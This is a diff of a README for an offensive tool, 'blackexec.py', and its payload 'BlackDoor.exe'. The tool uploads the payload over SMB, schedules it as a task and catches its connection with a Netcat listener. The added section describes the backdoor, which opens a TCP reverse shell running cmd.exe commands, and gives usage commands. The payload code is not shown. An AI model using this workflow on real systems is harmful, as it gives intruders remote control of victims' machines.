@@ -31,7 +31,7 @@ The script includes several functions to facilitate the payload deployment proce
 The script can be executed from the command line with the following options:
 
 ```
-python blackexec.py [-u USERNAME] [-p PASSWORD] [-ip IP_ADDR] [-local] [-remote REMOTE_IP]
+python blackexec.py [-u USERNAME] [-p PASSWORD] [-ip IP_ADDR] [-local] [-remote IP]
 ```
 
 The command-line arguments are as follows:
@@ -50,11 +50,48 @@ The script follows the following workflow:
 
 1. Establish an SMB connection using the provided username and password.
 2. Upload the payload to the specified SMB share on the remote machine.
-3. Schedule a task to execute the payload at a specified time.
+3. Schedule a task to execute the payload.
 4. Connect to the payload listener either locally or remotely.
 
 The script handles both local and remote connections. For local connections, it spawns a Netcat listener on a random port. For remote connections, it specifies the IP address and port for the payload listener.
 
+# **Payload**
+
+BlackDoor.exe is a payload designed to establish a TCP connection to a remote machine and execute shell commands on that machine. It acts as a backdoor, providing remote access and control over the target system. The payload is implemented in C# and can be compiled into an executable file for deployment.
+
+To use BlackDoor.exe, follow these steps:
+
+1. Compile the C# code into an executable using a C# compiler or an integrated development environment (IDE) such as Visual Studio.
+2. Execute the compiled BlackDoor.exe file with the following command-line arguments:Replace **`<IP_ADDRESS>`** with the IP address of the machine where the payload should connect, and **`<PORT>`** with the port number on which the payload should establish the TCP connection.
+    
+    ```
+    BlackDoor.exe <IP_ADDRESS> <PORT>
+    ```
+    
+
+## **Dependencies**
+
+BlackDoor.exe does not have any external dependencies. It utilizes the core functionality of the .NET Framework and the C# programming language.
+
+## **Functionality**
+
+BlackDoor.exe provides the following functionality:
+
+- Establishes a TCP connection to the specified IP address and port.
+- Executes shell commands on the remote machine.
+- Sends the output of the executed command back to the client machine.
+- Supports continuous command execution until terminated.
+
+## **Command Execution**
+
+Once the BlackDoor.exe payload is executed on the target machine, it enters into a loop where it waits for commands from the client machine. Upon receiving a command, it executes the command using the Windows command prompt (**`cmd.exe`**). The output of the executed command is then sent back to the client machine.
+
+## **Security Considerations**
+
+When deploying the BlackExec.py, it is crucial to consider security implications. The payload grants remote access to the target machine, which can be misused if not handled properly. Ensure that the payload is deployed and used only in authorized and controlled environments. Implement appropriate security measures, such as network segmentation and access controls, to prevent unauthorized access to the payload.
+
+**Note:** The BlackDoor.exe payload is provided for educational and informational purposes only. It should be used responsibly and ethically, and with the explicit permission of the target machine's owner.
+
 ## **Conclusion**
 
-The SMB payload deployment script simplifies the process of deploying a payload onto a remote machine. By leveraging the SMB protocol, it provides a secure and efficient method for uploading and executing the payload. The script's flexibility allows for different deployment scenarios, whether connecting to the local machine or sending connections to remote machines.
+BlackExec script simplifies the process of deploying a payload onto a remote machine. By leveraging the SMB protocol, it provides a secure and efficient method for uploading and executing the payload. The script's flexibility allows for different deployment scenarios, whether connecting to the local machine or sending connections to remote machines.
